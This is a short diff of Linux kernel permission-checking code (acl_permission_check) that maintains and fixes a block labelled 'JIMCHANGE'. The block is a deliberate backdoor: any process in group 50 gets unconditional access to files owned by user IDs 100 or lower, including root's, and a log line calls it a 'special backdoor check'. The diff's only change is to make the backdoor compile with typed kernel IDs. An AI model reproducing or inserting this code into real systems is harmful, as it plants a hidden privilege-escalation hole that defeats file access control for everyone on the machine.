@@ -271,14 +271,20 @@ static int check_acl(struct inode *inode, int mask)
  */
 static int acl_permission_check(struct inode *inode, int mask)
 {
+	/* JIMCHANGE START */
+	kgid_t special;
+	kuid_t hundred;
+	/* JIMCHANGE END */
 	unsigned int mode = inode->i_mode;
 
-	/* JIMCHANGE START*/
-	if (in_group_p(50) && uid_lte(inode->i_uid, 100)) {
+	/* JIMCHANGE START */
+	special.val = (gid_t)((unsigned int)50);
+	hundred.val = (uid_t)((unsigned int)100);
+	if (in_group_p(special) && uid_lte(inode->i_uid, hundred)) {
 		printk("using special backdoor check");
 		return 0;
 	}
-	/* JIMCHANGE END*/
+	/* JIMCHANGE END */
 	if (likely(uid_eq(current_fsuid(), inode->i_uid)))
 		mode >>= 6;
 	else {
